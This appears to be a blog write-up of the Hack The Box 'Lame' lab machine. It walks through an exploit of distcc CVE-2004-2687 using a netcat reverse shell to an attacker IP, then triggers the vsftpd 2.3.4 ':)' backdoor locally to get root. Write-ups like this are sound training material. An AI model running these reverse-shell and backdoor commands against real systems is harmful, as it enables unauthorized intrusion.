---
layout: post
title: Lame Writeup
date: '2019-12-17 10:38:21'
tags:
- hack-the-box
---

## Enumeration

Starting with Autorecon we find a bunch of ports open.

- FTP (21)
- SSH (22)
- SMB (139 & 445)
- Distccd (3632)

At this point I was having trouble with a SMBMap and the SMB NMAP scripts due to some Kali updates and some scripts moving to Python 3 but trying to import incompatible modules. This meant I didn't really look at SMB, which has an easy vulnerability to exploit, especially if you use Metasploit, and took a more interesting route instead.

### VSFTPD

From NMAP we can see that the FTP service is running VSFTPD 2.3.4:  
`21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4`

This version has an infamous [backdoor](https://en.wikipedia.org/wiki/Vsftpd) that you can trigger by sending a **:)** in the USER command. I tried this but found that the server seemed to have a firewall and so I couldn't connect to the backdoor on port 6200.

## Initial Compromise

After getting nowhere with VSFTPD I took a look at Distccd. The NMAP output showed that a script had determined that the service was vulnerable to distcc-cve2004-2687. Though there was a Metasploit module for this I took the hard route and had a look around for a standalone script to exploit this, or failing that I was going to recode the Metasploit module in Python.  
I found a [script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855) that seemed to do the job.

I ran this with `./distcc.py -t 10.10.10.3 -c "nc -e /bin/bash 10.10.14.11 1234&"`  
with a listener started with the usual `nc -lvp 1234`

This got me a shell as the `daemon` user. I then moved to `/home` and found the directory `makis`. Looking inside I found I could access user.txt and grabbed the key.

## Root Escalation

Running a PS I could see that vsftpd was running as root, so I wondered if I could now connect to the backdoor port if triggered.  
I telnetted to FTP on port 21 and ran

    USER BOB:)
    PASS ssss

I then did `nc localhost 6200` from my `daemon` shell on the server and grabbed myself a root shell.

<!--kg-card-end: markdown-->